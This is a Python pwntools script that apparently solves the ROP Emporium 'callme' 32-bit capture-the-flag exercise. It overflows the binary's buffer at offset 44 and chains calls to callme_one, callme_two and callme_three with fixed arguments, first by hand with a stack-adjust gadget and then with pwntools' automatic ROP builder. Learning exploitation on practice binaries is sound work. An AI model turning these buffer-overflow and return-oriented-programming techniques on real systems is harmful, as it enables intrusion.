#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './callme32'
elf = context.binary = ELF(exe, checksec=True)
libc = './libcallme32.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def init(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = init()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 44

# adjusting stack
stack_adjust = rop.find_gadget(["add esp, 8", "pop ebx", "ret"])[0]

# flattening  payload here
payload = flat({
    offset: [
        elf.sym['callme_one'],
        stack_adjust,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d,
        elf.sym['callme_two'],
        stack_adjust,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d,
        elf.sym['callme_three'],
        stack_adjust,
        0xdeadbeef,
        0xcafebabe,
        0xd00df00d,
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()
io.close()

# =========================================================
#                      AUTO EXPLOITS
# =========================================================
io = init()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 44

# set up parameters
parameters = [
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d
]

# crafting rop chain here
rop.callme_one(*parameters)
rop.callme_two(*parameters)
rop.callme_three(*parameters)
print(rop.dump())

# flattening  payload here
payload = flat({
    offset: [
        rop.chain()
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()
io.close()